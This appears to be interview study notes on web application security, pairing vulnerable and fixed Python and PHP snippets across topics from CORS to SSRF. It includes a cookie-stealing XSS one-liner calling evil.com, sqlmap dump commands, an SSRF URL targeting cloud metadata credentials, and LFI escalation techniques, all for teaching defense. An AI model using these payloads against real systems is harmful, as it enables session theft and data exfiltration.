# Web Application Security - Deep Dive

[Back to Main Notes](../interview-study-notes-for-security-engineering.md#web-application)

> **Prerequisites:** [Networking](networking.md) - HTTP/HTTPS basics  
> **Difficulty:** Intermediate

---

## Table of Contents

1. [Same Origin Policy](#1-same-origin-policy)
2. [CORS](#2-cors-cross-origin-resource-sharing)
3. [HSTS](#3-hsts-http-strict-transport-security)
4. [Certificate Transparency](#4-certificate-transparency)
5. [HTTP Public Key Pinning (HPKP)](#5-http-public-key-pinning-hpkp)
6. [Cookies and HttpOnly](#6-cookies-and-httponly)
7. [CSRF](#7-csrf-cross-site-request-forgery)
8. [XSS](#8-xss-cross-site-scripting)
9. [SQL Injection](#9-sql-injection)
10. [POST vs GET](#10-post-vs-get)
11. [Directory Traversal](#11-directory-traversal)
12. [API Security](#12-api-security)
13. [BeEF (Browser Exploitation Framework)](#13-beef-browser-exploitation-framework)
14. [User Agents](#14-user-agents)
15. [Browser Extension Takeovers](#15-browser-extension-takeovers)
16. [Local/Remote File Inclusion](#16-localremote-file-inclusion)
17. [SSRF](#17-ssrf-server-side-request-forgery)
18. [Web Vulnerability Scanners and SQLmap](#18-web-vulnerability-scanners-and-sqlmap)
19. [Malicious Redirects](#19-malicious-redirects)

---

## 1. Same Origin Policy

### Explanation

The Same Origin Policy (SOP) is the foundational security mechanism in web browsers. It restricts how a document or script loaded from one **origin** can interact with resources from another origin. An origin is defined by the tuple: **scheme + host + port**.

| URL | Same origin as `https://example.com/page`? | Reason |
|---|---|---|
| `https://example.com/other` | Yes | Same scheme, host, port |
| `http://example.com/page` | No | Different scheme |
| `https://api.example.com/page` | No | Different host (subdomain) |
| `https://example.com:8443/page` | No | Different port |

SOP governs DOM access, XMLHttpRequest/fetch, cookies, and web storage. Without SOP, any website could read your banking session data from another tab.

SOP does **not** block cross-origin writes (form submissions, link navigations) or embedding (images, scripts, iframes). This is why CSRF exists -- SOP allows the request to be *sent*, it just blocks reading the *response*.

### Interview Tip

**Q: "What does Same Origin Policy protect against?"**  
A: SOP prevents cross-origin *reads*. It does NOT prevent cross-origin writes (that is CSRF's domain) or embedding. This distinction is critical -- many candidates conflate SOP with blocking all cross-origin interaction.

### References

- [MDN: Same-origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)
- [RFC 6454 - The Web Origin Concept](https://tools.ietf.org/html/rfc6454)

---

## 2. CORS (Cross-Origin Resource Sharing)

### Explanation

CORS is a mechanism that **relaxes** the Same Origin Policy in a controlled way. It allows a server to declare which origins are permitted to read its responses. CORS uses HTTP headers to communicate these permissions.

Key headers:
- `Access-Control-Allow-Origin` -- which origins can read the response
- `Access-Control-Allow-Methods` -- allowed HTTP methods
- `Access-Control-Allow-Headers` -- allowed custom headers
- `Access-Control-Allow-Credentials` -- whether cookies are included
- `Access-Control-Max-Age` -- how long the preflight result is cached

**Simple requests** (GET/POST with standard headers) go directly with an `Origin` header; the server responds with `Access-Control-Allow-Origin`. **Preflight requests** (PUT/DELETE, custom headers) trigger an `OPTIONS` request first; the server must approve before the browser sends the actual request.

### Code Example

```python
# VULNERABLE: reflecting Origin blindly with credentials
@app.after_request
def add_cors(response):
    origin = request.headers.get("Origin", "*")
    response.headers["Access-Control-Allow-Origin"] = origin        # DANGEROUS
    response.headers["Access-Control-Allow-Credentials"] = "true"
    return response

# FIXED: explicit allowlist of origins
ALLOWED_ORIGINS = {"https://app.example.com", "https://admin.example.com"}

@app.after_request
def add_cors(response):
    origin = request.headers.get("Origin")
    if origin in ALLOWED_ORIGINS:
        response.headers["Access-Control-Allow-Origin"] = origin
        response.headers["Access-Control-Allow-Credentials"] = "true"
    return response
```

### Interview Tip

**Q: "Why can't you set `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`?"**  
A: The browser explicitly rejects this combination. If credentials (cookies) are sent, the server must echo back the specific requesting origin, not a wildcard. This prevents a universal credential-bearing bypass.

### References

- [MDN: CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
- [PortSwigger: CORS](https://portswigger.net/web-security/cors)

---

## 3. HSTS (HTTP Strict Transport Security)

### Explanation

HSTS tells browsers: "Only connect to me over HTTPS, **never** HTTP." Once a browser receives the `Strict-Transport-Security` header, it automatically converts all HTTP requests to HTTPS for `max-age` seconds. This prevents SSL-stripping attacks (classic **sslstrip** by Moxie Marlinspike, Black Hat 2009) where an attacker downgrades HTTPS to HTTP via MitM. Header format: `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`.

### Code Example

```nginx
# Nginx configuration
server {
    listen 443 ssl;
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
}
```

### Interview Tip

**Q: "What is the first-visit problem with HSTS?"**  
A: The very first time a user visits a site, they haven't received the HSTS header yet, so they're vulnerable to SSL-stripping. The HSTS preload list solves this by hardcoding domains into the browser itself.

### References

- [MDN: Strict-Transport-Security](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security)
- [RFC 6797](https://tools.ietf.org/html/rfc6797)

---

## 4. Certificate Transparency

### Explanation

Certificate Transparency (CT) requires CAs to log every issued certificate to publicly auditable, append-only Merkle tree logs. Browsers (Chrome since 2018) reject certificates without valid SCTs (Signed Certificate Timestamps). This makes misissued or rogue certificates detectable quickly. CT does not *prevent* bad issuance -- it makes it *visible*.

### Real-World Example

**Symantec CA Distrust (2017)**: Google discovered via CT logs that Symantec had misissued over 30,000 certificates. Without CT, this mass-misissue could have gone undetected.

### Interview Tip

**Q: "How does Certificate Transparency prevent rogue certificates?"**  
A: CT does not *prevent* issuance -- it makes it *detectable*. By requiring all certificates to be logged publicly, domain owners can monitor for unauthorized certs and revoke them quickly. Browsers that enforce CT (Chrome since 2018) reject certificates without valid SCTs.

### References

- [RFC 6962 - Certificate Transparency](https://tools.ietf.org/html/rfc6962)
- [Google: Certificate Transparency](https://certificate.transparency.dev/)

---

## 5. HTTP Public Key Pinning (HPKP)

### Explanation

HPKP (now **deprecated**) was an HTTP header that allowed websites to tell browsers which specific public keys to expect in the certificate chain. If a subsequent connection presented a different key, the browser would refuse the connection. This was designed to prevent CA compromise scenarios.

HPKP was deprecated in 2018 because misconfiguration or key loss could make a site permanently inaccessible ("HPKP suicide"), an attacker with brief header control could lock the legitimate owner out, and very few sites deployed it correctly. Certificate Transparency and CAA DNS records replaced it.

### Interview Tip

**Q: "Why was HPKP deprecated and what replaced it?"**  
A: HPKP was a brittle all-or-nothing mechanism. A single misconfiguration could make a site unreachable for the entire `max-age` duration with no recovery. Certificate Transparency and CAA (Certificate Authority Authorization) DNS records replaced it -- they detect unauthorized certificates without risking site availability.

### References

- [MDN: Public-Key-Pins (deprecated)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Public-Key-Pins)
- [RFC 7469](https://tools.ietf.org/html/rfc7469)

---

## 6. Cookies and HttpOnly

### Explanation

Cookies are the primary mechanism for maintaining state in HTTP (which is stateless). Security-relevant cookie attributes:

| Attribute | Purpose |
|---|---|
| `HttpOnly` | Cookie inaccessible to JavaScript (`document.cookie`) -- prevents XSS theft |
| `Secure` | Cookie only sent over HTTPS |
| `SameSite=Strict` | Cookie never sent on cross-site requests |
| `SameSite=Lax` | Cookie sent on top-level navigations but not on cross-origin subrequests |
| `SameSite=None` | Cookie sent on all cross-site requests (requires `Secure`) |
| `Path` | Restricts cookie to a URL path |
| `Domain` | Controls which hosts receive the cookie |

Without `HttpOnly`, an XSS payload like `new Image().src='https://evil.com/steal?c='+document.cookie` exfiltrates session cookies. With `HttpOnly`, `document.cookie` does not include the flagged cookie, so XSS cannot steal it (though the XSS itself still executes).

### Code Example

```python
# VULNERABLE: resp.set_cookie("session_id", "abc123")  # No flags!

# FIXED -- all security attributes set
@app.route("/login")
def login():
    resp = make_response("Logged in")
    resp.set_cookie(
        "session_id", "abc123",
        httponly=True,      # Block JavaScript access
        secure=True,        # HTTPS only
        samesite="Lax",     # Prevent CSRF on subrequests
        max_age=3600,       # 1 hour expiry
    )
    return resp
```

### Interview Tip

**Q: "Does HttpOnly prevent XSS?"**  
A: No. HttpOnly prevents **cookie theft** via XSS. The XSS still executes -- the attacker can still perform actions in the user's session via DOM manipulation or fetch requests. HttpOnly is defense-in-depth, not a substitute for input sanitization.

### References

- [MDN: Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie)
- [OWASP: Secure Cookie Attributes](https://owasp.org/www-community/controls/SecureCookieAttribute)

---

## 7. CSRF (Cross-Site Request Forgery)

### Explanation

CSRF exploits the browser's automatic inclusion of cookies on cross-origin requests. If a user is logged into `bank.com`, and they visit `evil.com`, JavaScript (or even a plain HTML form) on `evil.com` can submit a request to `bank.com` that carries the user's session cookie. The server sees a legitimate authenticated request.

CSRF works because SOP blocks reading responses but **does not block sending requests**.

### Code Example

```python
# FIXED -- CSRF token validation (synchronizer pattern)
@app.route("/transfer", methods=["POST"])
def transfer():
    if request.form.get("csrf_token") != session.get("csrf_token"):
        abort(403, "CSRF token mismatch")
    do_transfer(session["user"], request.form["to"], request.form["amount"])
    return "Transfer complete"
```

### Real-World Example

**Netflix CSRF (2006)**: Attackers could change account email/password by having authenticated users visit a malicious page, enabling full account takeover.

### Interview Tip

**Q: "What are the modern defenses against CSRF?"**  
A: (1) `SameSite=Lax` or `Strict` cookies (now the browser default in Chrome). (2) Anti-CSRF tokens (synchronizer pattern or double-submit cookie). (3) Checking `Origin` and `Referer` headers. (4) Requiring custom headers on API calls (e.g., `X-Requested-With`) since custom headers trigger CORS preflight.

### References

- [OWASP: CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger: CSRF](https://portswigger.net/web-security/csrf)

---

## 8. XSS (Cross-Site Scripting)

### Explanation

XSS occurs when an attacker injects executable scripts into content served to other users. The three types:

- **Reflected XSS**: Malicious script is part of the request (e.g., URL parameter) and reflected back in the response. Requires the victim to click a crafted link.
- **Stored (Persistent) XSS**: Malicious script is stored on the server (database, forum post, comment) and served to every user who views the page.
- **DOM-based XSS**: The vulnerability exists entirely in client-side JavaScript. The server never sees the payload -- the browser's JS reads a source (e.g., `location.hash`) and writes it to a sink (e.g., `innerHTML`).

### Code Example

```python
# VULNERABLE: return f"<h1>Results for: {query}</h1>"  # User input in HTML!

# FIXED -- proper output encoding
from markupsafe import escape

@app.route("/search")
def search():
    query = request.args.get("q", "")
    return f"<h1>Results for: {escape(query)}</h1>"  # < becomes &lt;, etc.
```

For DOM-based XSS, use `textContent` instead of `innerHTML`, or sanitize with DOMPurify.

### Real-World Example

**Samy Worm (2005)**: Stored XSS on MySpace created a self-replicating script affecting 1M+ users in 20 hours. **British Airways Magecart (2018)**: Injected script skimmed 380K credit cards; BA fined 20M GBP.

### Interview Tip

**Q: "What is the difference between input validation and output encoding for XSS prevention?"**  
A: Input validation restricts what data is accepted (allowlisting). Output encoding transforms data so it's treated as text, not code, in the specific output context (HTML, JS, URL, CSS). Output encoding is the primary defense because it's context-aware. A Content Security Policy (CSP) adds another layer by restricting where scripts can be loaded from.

### References

- [OWASP: XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger: XSS](https://portswigger.net/web-security/cross-site-scripting)

---

## 9. SQL Injection

### Explanation

SQL injection occurs when user input is concatenated directly into SQL queries. The attacker's input changes the query's structure, allowing them to read, modify, or delete data, bypass authentication, or execute OS commands.

**Types of SQLi:**
- **Error-based**: Extracts data through database error messages
- **Union-based**: Uses `UNION SELECT` to append attacker-controlled queries
- **Blind (Boolean)**: No data in the response -- infer data by observing true/false responses
- **Blind (Time-based)**: No visible difference -- infer data by measuring response time (e.g., `IF(condition, SLEEP(5), 0)`)
- **Out-of-band**: Exfiltrate data through DNS or HTTP requests initiated by the database

### Code Example

```python
# VULNERABLE: f"SELECT * FROM users WHERE username='{username}'"  # SQLi!

# FIXED -- parameterized queries (database driver handles escaping)
cursor.execute(
    "SELECT * FROM users WHERE username=? AND password=?",
    (username, password)
)
```

For production, use an ORM (e.g., SQLAlchemy) with hashed passwords.

### Real-World Example

**Heartland Payment Systems (2008)**: SQLi led to theft of 130M credit card numbers; attacker sentenced to 20 years. **Sony Pictures (2011)**: LulzSec used simple SQLi to exfiltrate 1M user records with plaintext passwords.

### Interview Tip

**Q: "Can an ORM still be vulnerable to SQL injection?"**  
A: Yes. ORMs that allow raw SQL fragments (e.g., `Model.objects.raw()`, `db.execute()`) or that pass unsanitized input to `order_by`, `extra()`, or `filter()` with string interpolation can still be vulnerable. The fix is to always use the ORM's query builder and parameterization, never concatenate user input.

### References

- [OWASP: SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger: SQL Injection](https://portswigger.net/web-security/sql-injection)

---

## 10. POST vs GET

### Explanation

GET and POST differ in security implications beyond just "retrieve vs submit":

| Aspect | GET | POST |
|---|---|---|
| Parameters | In URL query string | In request body |
| Browser history | Parameters saved in history | Body not saved |
| Bookmarkable | Yes (with parameters) | No |
| Cached | By default, yes | By default, no |
| Server logs | Parameters logged in access logs | Body typically not logged |
| Referer header | Parameters leak via Referer | Body does not leak |
| CSRF ease | Trivial (img/link/iframe) | Requires form/JS |
| Idempotent | Should be (safe method) | Not required |

GET parameters leak via browser history, server logs, Referer headers, and caches. State-changing actions on GET are trivially CSRF-able via `<img>` tags.

### Code Example

```python
# VULNERABLE: @app.route("/admin/delete-user")  # GET allows CSRF via <img> tag

# FIXED -- require POST with CSRF protection
@app.route("/admin/delete-user", methods=["POST"])
def delete_user():
    if request.form.get("csrf_token") != session.get("csrf_token"):
        abort(403)
    db.execute("DELETE FROM users WHERE id = ?", (request.form.get("id"),))
    return "User deleted"
```

### Interview Tip

**Q: "Is POST more secure than GET?"**  
A: POST is not inherently more secure -- the data still travels in plaintext over HTTP and can be intercepted. However, POST prevents parameter leakage through browser history, server logs, Referer headers, and caches. State-changing operations should always use POST (or PUT/DELETE) -- GET should be reserved for idempotent read operations.

### References

- [RFC 7231 - HTTP/1.1 Semantics: Safe Methods](https://tools.ietf.org/html/rfc7231#section-4.2.1)
- [OWASP: HTTP Request Methods](https://owasp.org/www-community/HttpMethods)

---

## 11. Directory Traversal

### Explanation

Directory traversal (path traversal) exploits insufficient input validation on file paths. The attacker uses `../` sequences (or encoded variants like `%2e%2e%2f`, double-encoding, null bytes) to escape the intended directory and access files like `/etc/passwd` or application configs.

### Code Example

```python
# VULNERABLE: filepath = os.path.join(UPLOAD_DIR, filename)  # ../../etc/passwd works!

# FIXED -- resolve real path and verify it's within allowed directory
UPLOAD_DIR = os.path.realpath("/var/www/uploads")

@app.route("/download")
def download():
    filename = request.args.get("file")
    filepath = os.path.realpath(os.path.join(UPLOAD_DIR, filename))
    if not filepath.startswith(UPLOAD_DIR + os.sep):
        abort(403, "Access denied")
    return send_file(filepath)
```

### Real-World Example

**CVE-2021-41773 (Apache HTTP Server 2.4.49)**: A path traversal vulnerability allowed attackers to access files outside the document root using URL-encoded sequences. With mod_cgi enabled, it also allowed RCE.

### Interview Tip

**Q: "Why is `os.path.join()` alone not sufficient to prevent path traversal?"**  
A: `os.path.join("/uploads", "../../../etc/passwd")` resolves to `/etc/passwd` because `os.path.join` handles `..` components. You must also call `os.path.realpath()` to resolve the full canonical path and then verify the result starts with the intended base directory.

### References

- [OWASP: Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [PortSwigger: Directory Traversal](https://portswigger.net/web-security/file-path-traversal)

---

## 12. API Security

### Explanation

APIs (REST, GraphQL, gRPC) face unique security challenges because they expose application logic directly. The OWASP API Security Top 10 (2023) highlights:

1. **Broken Object Level Authorization (BOLA/IDOR)** -- accessing other users' data by changing an ID
2. **Broken Authentication** -- weak token handling, no rate limiting
3. **Broken Object Property Level Authorization** -- mass assignment, excessive data exposure
4. **Unrestricted Resource Consumption** -- no rate limiting, DoS
5. **Broken Function Level Authorization** -- accessing admin endpoints as a user
6. **Server Side Request Forgery** -- (covered in section 17)
7. **Security Misconfiguration** -- verbose errors, default credentials
8. **Lack of Protection from Automated Threats** -- credential stuffing, scraping
9. **Improper Asset Management** -- old API versions still running
10. **Unsafe Consumption of APIs** -- trusting third-party API data without validation

### Code Example

```python
# VULNERABLE -- IDOR (Broken Object Level Authorization)
@app.route("/api/invoices/<int:invoice_id>")
def get_invoice(invoice_id):
    # Any authenticated user can access ANY invoice by changing the ID
    invoice = db.query(Invoice).get(invoice_id)
    return jsonify(invoice.to_dict())
```

```python
# FIXED -- verify ownership
@app.route("/api/invoices/<int:invoice_id>")
@login_required
def get_invoice(invoice_id):
    invoice = db.query(Invoice).filter_by(
        id=invoice_id,
        owner_id=current_user.id  # Enforce ownership
    ).first_or_404()
    return jsonify(invoice.to_dict())
```

### Real-World Example

**Peloton API IDOR (2021)**: Any user could access any other user's profile data by changing the user ID parameter. **Facebook Graph API (2018)**: An IDOR in "View As" allowed stealing access tokens for 50M accounts.

### Interview Tip

**Q: "How do you secure an API against IDOR?"**  
A: (1) Never rely on sequential/guessable IDs alone -- always verify the requesting user has authorization to access the specific resource. (2) Use UUIDs instead of auto-incrementing integers to reduce guessability. (3) Implement object-level authorization checks in every endpoint, ideally through middleware or a policy engine (e.g., OPA, Casbin). (4) Write automated tests that verify user A cannot access user B's resources.

### References

- [OWASP API Security Top 10 (2023)](https://owasp.org/API-Security/)
- [PortSwigger: API Testing](https://portswigger.net/web-security/api-testing)

---

## 13. BeEF (Browser Exploitation Framework)

### Explanation

BeEF (Browser Exploitation Framework) is a penetration testing tool that focuses on the web browser as the attack vector. It uses a JavaScript "hook" (beefhook) that, when loaded in a victim's browser, gives the attacker a command-and-control channel to the browser. The hook is typically delivered via XSS.

BeEF works by injecting `hook.js` via XSS, which establishes a persistent C2 channel to the attacker. From a hooked browser, the attacker can steal credentials, keylog, port scan internal networks, and use the browser as a pivot point into corporate infrastructure.

### Interview Tip

**Q: "Why should we care about XSS beyond cookie theft?"**  
A: Reference BeEF -- a single XSS can give an attacker persistent control over the browser session. From there, they can keylog, phish, scan internal networks, and pivot into the corporate network. XSS is not just about `alert(1)` -- it is often the entry point for full compromise.

### References

- [BeEF Project](https://beefproject.com/)
- [OWASP: Browser Exploitation Framework](https://owasp.org/www-project-web-testing-environment/)

---

## 14. User Agents

### Explanation

The `User-Agent` HTTP header identifies the client making the request (browser type, version, OS). From a security perspective:

- **Fingerprinting**: User-Agent strings help fingerprint browsers for targeted exploits
- **Spoofing**: Trivially spoofed -- never use for access control
- **WAF evasion**: Attackers change User-Agent to bypass web application firewalls
- **Bot detection**: Legitimate vs. malicious bot identification
- **Client-Hints**: Modern replacement (`Sec-CH-UA`) that is more privacy-preserving

### Code Example

```python
# VULNERABLE: trusting User-Agent for access control
if "InternalMonitorBot/1.0" in ua:
    return jsonify(get_admin_data())  # No auth for "bot"!

# FIXED -- never trust User-Agent for authz; use proper auth
@app.route("/admin")
@login_required
@require_role("admin")
def admin():
    return jsonify(get_admin_data())
```

### Interview Tip

**Q: "Should User-Agent strings be used for security decisions?"**  
A: Never for authentication or authorization. They are trivially spoofed with a single header. They can be useful for logging, analytics, and as one weak signal in a broader bot-detection system, but never as a sole trust factor.

### References

- [MDN: User-Agent](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent)
- [MDN: User-Agent Client Hints](https://developer.mozilla.org/en-US/docs/Web/HTTP/Client_hints#user-agent_client_hints)

---

## 15. Browser Extension Takeovers

### Explanation

Browser extensions run with elevated privileges -- they can read/modify web pages, intercept requests, access cookies, and more. Extension takeovers occur when:

1. **Malicious acquisition**: A popular extension is bought from its developer, then updated with malicious code
2. **Compromised developer account**: Attacker gains access to the extension's developer account and pushes a malicious update
3. **Supply chain attack**: A dependency used by the extension is compromised
4. **Permissions abuse**: Extensions request overly broad permissions (e.g., "read and change all your data on all websites")

### Real-World Example

**The Great Suspender (2021)**: A 2M-user Chrome extension was sold to an unknown entity that injected malicious tracking code. **Cyberhaven (2024)**: Attackers phished a developer's Chrome Web Store credentials and pushed a malicious update exfiltrating session cookies.

### Interview Tip

**Q: "How do you mitigate browser extension risks in an enterprise?"**  
A: (1) Use Chrome Enterprise or similar MDM to maintain an extension allowlist. (2) Block extensions that request overly broad permissions. (3) Monitor for extension updates that change permissions. (4) Use browser isolation for sensitive applications. (5) Regularly audit installed extensions across the fleet.

### References

- [Chrome Enterprise: Extension Management](https://chromeenterprise.google/policies/)
- [OWASP: Browser Extension Security](https://owasp.org/www-community/attacks/Browser_Extension_Attacks)

---

## 16. Local/Remote File Inclusion

### Explanation

File inclusion vulnerabilities occur when an application dynamically includes files based on user input.

- **Local File Inclusion (LFI)**: Includes files already on the server. Can read sensitive files or, if the attacker can control any file on disk (log poisoning, file uploads), achieve RCE.
- **Remote File Inclusion (RFI)**: Includes files from a remote URL. Directly leads to RCE if the server fetches and executes attacker-hosted code. RFI requires `allow_url_include=On` in PHP.

### Code Example

```php
// VULNERABLE: include("pages/" . $_GET['page']);  // LFI and RFI!

// FIXED -- whitelist of allowed pages
<?php
$allowed_pages = ['home', 'about', 'contact', 'faq'];
$page = $_GET['page'] ?? 'home';
if (in_array($page, $allowed_pages, true)) {
    include("pages/" . $page . ".php");
} else {
    http_response_code(404);
    include("pages/404.php");
}
?>
```

### Real-World Example

**TimThumb WordPress Plugin (2011)**: RFI in the popular image resizing script allowed attackers to include malicious PHP from remote URLs. Millions of WordPress sites were compromised.

### Interview Tip

**Q: "How can LFI be escalated to RCE without RFI?"**  
A: Several techniques: (1) Log poisoning -- inject PHP into access/error logs, then include the log. (2) `/proc/self/environ` -- inject payload into User-Agent, include the environ file. (3) PHP wrapper abuse -- `php://filter/convert.base64-encode/resource=config.php` to read source, or `php://input` to inject code. (4) Session file inclusion -- inject PHP into a session variable, then include the session file from `/tmp`.

### References

- [OWASP: LFI/RFI](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
- [PayloadsAllTheThings: File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

---

## 17. SSRF (Server Side Request Forgery)

### Explanation

SSRF occurs when an attacker can make the **server** send requests to unintended locations. The server acts as a proxy, allowing the attacker to reach internal services, cloud metadata endpoints, or other resources that are not directly accessible from the internet.

SSRF is especially dangerous in cloud environments where the instance metadata service (e.g., `http://169.254.169.254/`) can expose IAM credentials.

### Code Example

```python
# VULNERABLE: response = requests.get(request.args.get("url"))
# Attacker: ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# FIXED -- validate URL, block internal ranges, resolve DNS before request
import ipaddress, socket
from urllib.parse import urlparse

BLOCKED_NETWORKS = [
    ipaddress.ip_network("10.0.0.0/8"), ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"), ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("169.254.0.0/16"),  # Cloud metadata!
]

def is_safe_url(url):
    parsed = urlparse(url)
    if parsed.scheme not in {"http", "https"}:
        return False
    try:
        ip = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))
    except (socket.gaierror, ValueError):
        return False
    return not any(ip in net for net in BLOCKED_NETWORKS)
```

### Real-World Example

**Capital One Breach (2019)**: SSRF in Capital One's WAF exposed EC2 metadata credentials, leading to exfiltration of 100M customer records from S3 -- arguably the most impactful SSRF in history. **GitLab SSRF (CVE-2021-22214)**: Unauthenticated SSRF in CI/CD integration exposed internal networks and cloud metadata.

### Interview Tip

**Q: "How does IMDSv2 mitigate SSRF on AWS?"**  
A: IMDSv2 requires a PUT request with a custom header (`X-aws-ec2-metadata-token-ttl-seconds`) to obtain a session token before any metadata can be accessed. Since most SSRF vulnerabilities only allow GET requests and cannot set custom headers, IMDSv2 blocks the majority of SSRF-to-metadata attacks. However, if the SSRF allows full HTTP method and header control, IMDSv2 can still be bypassed.

### References

- [OWASP: SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [PortSwigger: SSRF](https://portswigger.net/web-security/ssrf)

---

## 18. Web Vulnerability Scanners and SQLmap

### Explanation

Web vulnerability scanners automate the discovery of security flaws. They range from general-purpose scanners to specialized tools:

**General-purpose:**
- **Burp Suite Pro** -- industry-standard proxy and scanner for web app testing
- **OWASP ZAP** -- free, open-source alternative to Burp
- **Nikto** -- web server scanner focused on misconfigurations and outdated software
- **Nuclei** -- template-based scanner with a massive community-contributed template library

**Specialized:**
- **SQLmap** -- automated SQL injection detection and exploitation
- **XSStrike** -- XSS detection with intelligent payload generation
- **Commix** -- OS command injection exploitation
- **WPScan** -- WordPress-specific vulnerability scanner

### Code Example

```bash
# SQLmap: automated SQL injection detection and exploitation
sqlmap -u "https://site.com/item?id=1" --batch --dbs         # Enumerate databases
sqlmap -u "https://site.com/item?id=1" -D dbname -T users --dump  # Dump table
sqlmap -u "https://site.com/login" --data="user=admin&pass=x" -p user  # POST
```

### Interview Tip

**Q: "When would you use a scanner vs. manual testing?"**  
A: Scanners are excellent for finding low-hanging fruit at scale (missing headers, known CVEs, basic injection points). Manual testing is essential for business logic flaws, complex authentication bypasses, and chained vulnerabilities that scanners miss. A thorough assessment uses both -- scanners for breadth, manual testing for depth.

### References

- [SQLmap](https://sqlmap.org/)
- [Burp Suite](https://portswigger.net/burp)

---

## 19. Malicious Redirects

### Explanation

Open redirect vulnerabilities occur when an application redirects users to a URL specified in a parameter without proper validation. Attackers abuse this to redirect victims to phishing sites while the initial link appears to come from a trusted domain.

**Types:**
- **Open redirect** -- server-side redirect via 301/302 response
- **DOM-based redirect** -- client-side redirect via `window.location = user_input`
- **Header injection redirect** -- injecting `\r\nLocation:` into HTTP headers

### Code Example

```python
# VULNERABLE: return redirect(request.args.get("next", "/"))  # ?next=https://evil.com

# FIXED -- validate redirect URL is relative / on-domain
from urllib.parse import urlparse

ALLOWED_HOSTS = {"trusted.com", "www.trusted.com"}

@app.route("/login", methods=["POST"])
def login():
    next_url = request.args.get("next", "/")
    parsed = urlparse(next_url)
    if parsed.netloc and parsed.netloc not in ALLOWED_HOSTS:
        next_url = "/"
    if next_url.startswith("//"):  # Block protocol-relative URLs
        next_url = "/"
    return redirect(next_url)
```

### Real-World Example

Open redirects are used extensively in phishing. More critically, in OAuth 2.0 flows, an open redirect on the `redirect_uri` domain can steal authorization codes or tokens -- demonstrated against Facebook, Microsoft, and others.

### Interview Tip

**Q: "Why are open redirects often classified as low severity but still dangerous?"**  
A: On their own, open redirects require user interaction and only facilitate phishing -- hence "low" severity in many bug bounty programs. However, they become high-severity when chained with OAuth flows (stealing tokens), used to bypass SSRF URL allowlists, or combined with CSRF attacks. The severity depends entirely on context.

### References

- [OWASP: Unvalidated Redirects and Forwards](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
- [CWE-601: URL Redirection to Untrusted Site](https://cwe.mitre.org/data/definitions/601.html)

---

## Key Takeaways

- **Same Origin Policy** is the foundation of web security, but it only blocks cross-origin reads -- not writes (CSRF) or embedding (clickjacking).
- **Output encoding** is the primary defense against XSS; input validation and CSP are complementary layers.
- **Parameterized queries** (not string concatenation) are the only reliable defense against SQL injection. ORMs help but are not bulletproof.
- **SSRF** is critical in cloud environments -- always block access to `169.254.169.254` and internal networks. Use IMDSv2 on AWS.
- **CORS misconfigurations** that reflect the Origin header with credentials enabled effectively disable SOP.
- **Cookie security attributes** (HttpOnly, Secure, SameSite) are free defense-in-depth -- there is no reason not to set them.
- **Open redirects** are force multipliers -- alone they are low severity, but chained with OAuth or SSRF they become critical.
- **Browser extensions** represent an often-overlooked attack surface -- enterprise extension management is essential.

## Interview Practice Questions

1. **"Walk me through the full lifecycle of an XSS attack, from discovery to impact, and how you would defend against it at each stage."**
   - Expect discussion of: input validation, output encoding, CSP, HttpOnly cookies, WAF, and the difference between reflected/stored/DOM-based.

2. **"A penetration tester found an SSRF vulnerability in your application. What is the worst-case impact in an AWS environment, and how would you remediate?"**
   - Expect: metadata service credential theft, lateral movement, IMDSv2, URL validation, network segmentation.

3. **"Explain how SameSite cookies have changed the CSRF landscape. Are CSRF tokens still necessary?"**
   - Expect: SameSite=Lax is now the default, covers most CSRF scenarios, but tokens are still needed for subdomains, older browsers, and `SameSite=None` scenarios.

4. **"You discover that your API returns different error messages for 'user not found' vs 'wrong password'. Why is this a security issue and how would you fix it?"**
   - Expect: username enumeration, timing attacks, generic error messages, constant-time comparison.

5. **"Describe how you would test a web application for SQL injection if you had no access to the source code."**
   - Expect: methodology (identify injection points, test with quotes/boolean conditions, use time-based blind techniques, escalate with sqlmap, enumerate with union-based), and ethical/legal boundaries.

6. **"How would you architect a 'fetch URL' feature that is resistant to SSRF?"**
   - Expect: URL parsing, DNS resolution before request, IP blocklist, allowlist of schemes, disable redirects, timeout limits, sandboxed execution environment, network-level controls.

## Hands-On Labs

- **PortSwigger Web Security Academy**: https://portswigger.net/web-security -- Free labs for every topic in this guide
- **OWASP Juice Shop**: https://owasp.org/www-project-juice-shop/ -- 100+ challenges covering XSS, SQLi, CSRF, SSRF
- **DVWA**: https://github.com/digininja/DVWA -- Classic practice target with adjustable difficulty

---

[Previous: Networking](networking.md) | [Next: Infrastructure & Cloud](infrastructure-cloud.md)
